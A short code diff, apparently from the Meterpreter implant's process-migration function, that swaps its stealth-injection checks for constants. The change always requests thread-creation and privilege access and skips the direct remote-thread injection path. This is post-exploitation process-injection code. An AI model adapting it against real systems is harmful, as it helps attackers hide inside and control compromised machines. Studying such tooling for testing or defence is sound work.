@@ -572,7 +572,7 @@ BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResul
 
 		bStealth = support_stealth_injection(dwDestinationArch);
 
-		if(!bStealth) {
+		if(TRUE) {
 			if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
 			{
 				TOKEN_PRIVILEGES priv = { 0 };
@@ -592,7 +592,7 @@ BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResul
 			}
 		}
 		dwProcessAccess = PROCESS_DUP_HANDLE | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ;
-		if (!bStealth) {
+		if (TRUE) {
 			dwProcessAccess |= PROCESS_CREATE_THREAD;
 		}
 
@@ -679,7 +679,7 @@ BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResul
 
 		free(ctx);
 
-		if (!bStealth) {
+		if (FALSE) {
 			// First we try to migrate by directly creating a remote thread in the target process
 			if (inject_via_remotethread(remote, response, hProcess, dwDestinationArch, lpMemory, lpMemory + dwMigrateStubLength) != ERROR_SUCCESS)
 			{
